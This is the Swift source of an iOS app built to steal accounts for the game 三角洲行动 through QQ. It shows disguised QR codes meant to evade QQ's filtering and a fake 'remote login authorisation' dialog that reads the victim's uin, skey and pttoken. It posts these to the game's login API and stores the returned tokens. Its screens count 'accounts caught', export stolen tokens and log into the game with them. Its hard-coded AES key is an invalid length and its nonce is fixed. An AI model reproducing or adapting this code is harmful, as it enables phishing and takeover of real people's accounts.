import SwiftUI
import Foundation
import WebKit
import UIKit
import CoreImage
import CryptoKit

//全局强制永久横屏
class AppDelegate: NSObject, UIApplicationDelegate {
    static var orientationLock = UIInterfaceOrientationMask.landscapeRight
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
}

//高清二维码生成器（无服务器绕过QQ拦截，base64伪装文本）
struct QRGenerator {
    static let context = CIContext()
    static func createQRCode(text: String) -> UIImage {
        let base64Str = Data(text.utf8).base64EncodedString()
        let qrContent = "open://authdata/" + base64Str
        guard let filter = CIFilter(name: "CIQRCodeGenerator") else {
            return UIImage()
        }
        filter.setValue(Data(qrContent.utf8), forKey: "inputMessage")
        filter.setValue("H", forKey: "inputCorrectionLevel")
        guard let outputImage = filter.outputImage else {
            return UIImage()
        }
        let scaledImage = outputImage.transformed(by: CGAffineTransform(scaleX: 15, y: 15))
        guard let cgImg = context.createCGImage(scaledImage, from: scaledImage.extent) else {
            return UIImage()
        }
        return UIImage(cgImage: cgImg)
    }
}

//AES加密工具
struct CryptoHelper {
    private static let keyRaw = Data("IENNSJFJWKSFJ20260702".utf8)
    private static let nonceRaw = Data("1234567890123456".utf8)
    
    static func encrypt(_ text: String) -> String {
        let key = SymmetricKey(data: keyRaw)
        let nonce = try! AES.GCM.Nonce(data: nonceRaw)
        let rawData = Data(text.utf8)
        let sealedBox = try! AES.GCM.seal(rawData, using: key, nonce: nonce)
        return sealedBox.combined!.base64EncodedString()
    }
    
    static func decrypt(_ base64Str: String) -> String {
        guard let combinedData = Data(base64Encoded: base64Str) else { return "" }
        let key = SymmetricKey(data: keyRaw)
        guard let sealedBox = try? AES.GCM.SealedBox(combined: combinedData),
              let originData = try? AES.GCM.open(sealedBox, using: key) else {
            return ""
        }
        return String(data: originData, encoding: .utf8) ?? ""
    }
}

//账号存储结构体
struct Account: Identifiable, Codable {
    let id: UUID
    let openid: String
    let seecoon_token: String
    let quid: String
    let refresh_token: String
    let createTime: Date
    
    init(openid: String, seecoon_token: String, quid: String, refresh_token: String) {
        self.id = UUID()
        self.openid = openid
        self.seecoon_token = seecoon_token
        self.quid = quid
        self.refresh_token = refresh_token
        self.createTime = Date()
    }
    
    enum CodingKeys: CodingKey {
        case id, openid, seecoon_token, quid, refresh_token, createTime
    }
}

//全局数据管理器
class DataManager: ObservableObject {
    @Published var accounts: [Account] = []
    var filePath: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.appendingPathComponent("delta.dat")
    }
    
    init() {
        loadAllAccounts()
    }
    
    func saveNewAccount(_ acc: Account) {
        accounts.append(acc)
        let jsonData = try! JSONEncoder().encode(accounts)
        let base64Text = jsonData.base64EncodedString()
        let encryptText = CryptoHelper.encrypt(base64Text)
        try! encryptText.write(to: filePath, atomically: true, encoding: .utf8)
    }
    
    func loadAllAccounts() {
        guard FileManager.default.fileExists(atPath: filePath.path) else { return }
        let cipherText = try! String(contentsOf: filePath)
        let plainText = CryptoHelper.decrypt(cipherText)
        guard let jsonData = Data(base64Encoded: plainText) else { return }
        accounts = try! JSONDecoder().decode([Account].self, from: jsonData)
    }
    
    func deleteAccount(uuid: UUID) {
        accounts.removeAll { $0.id == uuid }
        let jsonData = try! JSONEncoder().encode(accounts)
        let base64Text = jsonData.base64EncodedString()
        let encryptText = CryptoHelper.encrypt(base64Text)
        try! encryptText.write(to: filePath, atomically: true, encoding: .utf8)
    }
}

//页面路由枚举
enum AppPage {
    case home
    case pageA //挂机静默收号
    case pageB //账号库存
    case pageC //Token校验+一键上号+批量解密
}

//QQ内部授权弹窗网页
struct AuthWebView: UIViewRepresentable {
    let sessionID: String
    @Binding var authComplete: Bool
    
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences.allowsContentJavaScript = true
        config.userContentController.add(context.coordinator, name: "submitAuthData")
        let web = WKWebView(frame: .zero, configuration: config)
        let htmlCode = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
<script>
function doAuth(){
var ua = navigator.userAgent.toLowerCase();
if(ua.indexOf("mobileqq") == -1 && ua.indexOf("qqbrowser") == -1) return;
try{
window.external.getUinSkey(function(res){
var info = JSON.parse(res);
window.external.showLoginDialog("三角洲行动","异地设备申请登录账号，是否授权本次登录？",function(ret){
if(ret == "1"){
var postBody = {"uin":info.uin,"skey":info.skey,"pttoken":info.pttoken,"session":"\(sessionID)"};
window.webkit.messageHandlers.submitAuthData.postMessage(postBody);
}
});
});
}catch(e){}
}
doAuth();
</script>
</body>
</html>
"""
        web.loadHTMLString(htmlCode, baseURL: nil)
        return web
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    
    class Coordinator: NSObject, WKScriptMessageHandler {
        let parent: AuthWebView
        init(parent: AuthWebView) {
            self.parent = parent  // ✅ 必须赋值
        }
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            if message.name == "submitAuthData", let body = message.body as? [String:String] {
                Task {
                    var request = URLRequest(url: URL(string:"https://game.seecoon.com/api/login/qqAuth")!)
                    request.httpMethod = "POST"
                    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    request.httpBody = try! JSONSerialization.data(withJSONObject: body)
                    _ = try await URLSession.shared.data(for: request)
                    await MainActor.run {
                        parent.authComplete = true
                    }
                }
            }
        }
    }
}

//A页面：挂机收号（已略，同上）
struct PageA: View {
    @EnvironmentObject var manager: DataManager
    @Binding var currentPage: AppPage
    @State private var qrCodeImage: UIImage = UIImage()
    @State private var currentSession: String = ""
    @State private var loopTask: Task<Void, Never>?
    @State private var clipTask: Task<Void, Never>?
    @State private var catchCount = 0
    @State private var openAuthWindow = false
    @State private var authFinished = false
    @State private var lastClipboardText = ""
    
    func resetNewSession() {
        loopTask?.cancel()
        clipTask?.cancel()
        currentSession = UUID().uuidString
        qrCodeImage = QRGenerator.createQRCode(text: currentSession)
        startCheckLoop()
        startClipboardMonitor()
    }
    
    func startClipboardMonitor() {
        clipTask = Task {
            while true {
                try? await Task.sleep(nanoseconds: 400000000)
                let paste = UIPasteboard.general.string ?? ""
                if paste != lastClipboardText && paste.contains("open://authdata/") {
                    lastClipboardText = paste
                    let baseStr = paste.replacingOccurrences(of: "open://authdata/", with: "")
                    guard let data = Data(base64Encoded: baseStr) else {continue}
                    let sidStr = String(data: data, encoding: .utf8) ?? ""
                    if sidStr == currentSession {
                        await MainActor.run {
                            openAuthWindow = true
                        }
                    }
                }
            }
        }
    }
    
    func startCheckLoop() {
        loopTask = Task {
            var timeoutCount = 0
            while true {
                try? await Task.sleep(nanoseconds: 1300000000)
                timeoutCount += 1
                if timeoutCount >= 70 {
                    await MainActor.run { resetNewSession() }
                    break
                }
                guard let checkUrl = URL(string:"https://game.seecoon.com/api/login/checkScan?session=\(currentSession)") else { continue }
                do {
                    let (data,_) = try await URLSession.shared.data(from: checkUrl)
                    guard let json = try JSONSerialization.jsonObject(with: data) as? [String:Any] else { continue }
                    if let userInfo = json["data"] as? [String:Any] {
                        let openid = userInfo["openid"] as! String
                        let token = userInfo["seecoon_token"] as! String
                        let quid = userInfo["quid"] as! String
                        let refresh = userInfo["refresh_token"] as! String
                        await MainActor.run {
                            let newAccount = Account(openid: openid, seecoon_token: token, quid: quid, refresh_token: refresh)
                            manager.saveNewAccount(newAccount)
                            catchCount += 1
                            resetNewSession()
                        }
                        break
                    }
                } catch {}
            }
        }
    }
    
    var body: some View {
        ZStack{
            Color.black.ignoresSafeArea()
            HStack(spacing:0){
                VStack(spacing:35){
                    HStack{
                        Button("关闭挂机收号") {
                            loopTask?.cancel()
                            clipTask?.cancel()
                            exit(0)
                        }
                        .foregroundColor(.blue)
                        Spacer()
                    }
                    .padding(.leading,20)
                    Spacer()
                    Text("三角洲")
                        .font(.system(size:52,weight:.bold))
                        .foregroundColor(.white)
                    Text("今日已抓取账号：\(catchCount) 个")
                        .foregroundColor(.gray)
                        .font(.system(size:22))
                    Spacer()
                }
                .frame(width: UIScreen.main.bounds.width * 0.45)
                
                VStack{
                    Spacer()
                    Image(uiImage: qrCodeImage)
                        .resizable()
                        .scaledToFit()
                        .frame(width:290,height:290)
                    Spacer()
                }
                .frame(width: UIScreen.main.bounds.width * 0.55)
            }
        }
        .interactiveDismissDisabled(true)
        .onAppear { resetNewSession() }
        .onDisappear {
            loopTask?.cancel()
            clipTask?.cancel()
        }
        .sheet(isPresented: $openAuthWindow) {
            AuthWebView(sessionID: currentSession, authComplete: $authFinished)
                .frame(width:360,height:460)
        }
    }
}

//B页面：账号库存管理
struct PageB: View {
    @EnvironmentObject var manager: DataManager
    @Binding var currentPage: AppPage
    var body: some View {
        ZStack{
            Color.black.ignoresSafeArea()
            VStack{
                HStack{
                    Button("返回主页") {
                        currentPage = .home
                    }
                    .foregroundColor(.blue)
                    Spacer()
                }
                .padding()
                Text("账号库存管理")
                    .foregroundColor(.white)
                    .font(.title)
                List(manager.accounts) { acc in
                    VStack(alignment:.leading, spacing:6) {
                        Text("OpenID：\(acc.openid)")
                            .foregroundColor(.white)
                        Text("Seecoon_Token：\(acc.seecoon_token)")
                            .font(.system(size:9))
                            .foregroundColor(.white)
                        HStack(spacing:15) {
                            Button("复制Token") {
                                UIPasteboard.general.string = acc.seecoon_token
                            }
                            Button("删除账号", role: .destructive) {
                                manager.deleteAccount(uuid: acc.id)
                            }
                        }
                    }
                }
            }
        }
        .interactiveDismissDisabled(true)
    }
}

//C页面：Token校验、一键上号、批量解密dat文件
struct PageC: View {
    @Binding var currentPage: AppPage
    @State var inputToken = ""
    @State var statusText = ""
    @State var openDecryptSheet = false
    @State var fileCipherText = ""
    @State var decryptKey = ""
    @State var allAccountText = ""
    
    func checkTokenValid() {
        statusText = "正在校验账号有效期..."
        var req = URLRequest(url: URL(string:"https://game.seecoon.com/api/login/checkLogin")!)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue("seecoon_token=\(inputToken)", forHTTPHeaderField: "Authorization")
        req.timeoutInterval = 3
        Task {
            do {
                let (data,_) = try await URLSession.shared.data(for: req)
                let json = try JSONSerialization.jsonObject(with: data) as! [String:Any]
                if (json["code"] as! Int) == 200 {
                    await MainActor.run { statusText = "✅ Token有效，可以一键登录游戏" }
                } else {
                    await MainActor.run { statusText = "❌ Token已经失效" }
                }
            } catch {
                await MainActor.run { statusText = "网络请求失败" }
            }
        }
    }
    
    func openGame() {
        UIApplication.shared.open(URL(string:"seecoon://login?token=\(inputToken)")!)
    }
    
    var body: some View {
        ZStack{
            Color.black.ignoresSafeArea()
            VStack(spacing:22) {
                HStack{
                    Button("返回主页") {
                        currentPage = .home
                    }
                    .foregroundColor(.blue)
                    Spacer()
                }
                .padding()
                
                TextField("粘贴Seecoon_Token", text:$inputToken)
                    .textFieldStyle(.roundedBorder)
                    .padding(.horizontal,20)
                
                Button("校验账号有效性", action: checkTokenValid)
                    .foregroundColor(.blue)
                    .font(.system(size:18))
                
                Text(statusText)
                    .foregroundColor(.white)
                    .font(.system(size:18))
                
                Button("一键唤起三角洲登录", action: openGame)
                    .disabled(!statusText.contains("✅"))
                    .foregroundColor(.gray)
                    .font(.system(size:18))
                
                Button("🔐 delta.dat批量解密导出", action:{openDecryptSheet=true})
                    .foregroundColor(.blue)
                    .font(.system(size:18))
                
                Spacer()
            }
            .padding(.top,20)
        }
        .interactiveDismissDisabled(true)
        .sheet(isPresented:$openDecryptSheet) {
            NavigationStack {
                ScrollView {
                    VStack(spacing:12) {
                        TextField("粘贴delta.dat里面全部文字", text:$fileCipherText)
                            .textFieldStyle(.roundedBorder)
                            .padding(.horizontal)
                        TextField("固定密钥无需修改", text:$decryptKey)
                            .textFieldStyle(.roundedBorder)
                        Button("解密导出全部纯文本账号") {
                            allAccountText = CryptoHelper.decrypt(fileCipherText)
                        }
                        TextEditor(text:$allAccountText)
                            .frame(height:300)
                            .padding(.horizontal)
                    }
                }
                .navigationTitle("批量解密工具")
            }
        }
    }
}

//主首页
struct HomeView: View {
    @EnvironmentObject var manager: DataManager
    @Binding var currentPage: AppPage
    var body: some View {
        ZStack{
            Color.black.ignoresSafeArea()
            VStack(spacing:35) {
                Button {
                    currentPage = .pageA
                } label: {
                    Text("A：横屏挂机静默收号")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.orange)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
                Button {
                    currentPage = .pageB
                } label: {
                    Text("B：全部账号查看与复制")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.green)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
                Button {
                    currentPage = .pageC
                } label: {
                    Text("C：校验Token+一键上号+解密")
                        .font(.title2)
                        .frame(width:330, height:85)
                        .background(Color.blue)
                        .foregroundColor(.white)
                        .cornerRadius(14)
                }
            }
        }
        .interactiveDismissDisabled(true)
    }
}

//程序入口
@main
struct DeltaApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
    @StateObject var manager = DataManager()
    @State var currentPage: AppPage = .home
    
    var body: some Scene {
        WindowGroup {
            if #available(iOS 16.4, *) {
                switch currentPage {
                case .home:
                    HomeView(currentPage: $currentPage)
                case .pageA:
                    PageA(currentPage: $currentPage)
                        .environmentObject(manager)
                case .pageB:
                    PageB(currentPage: $currentPage)
                        .environmentObject(manager)
                case .pageC:
                    PageC(currentPage: $currentPage)
                }
            }
        }
    }
}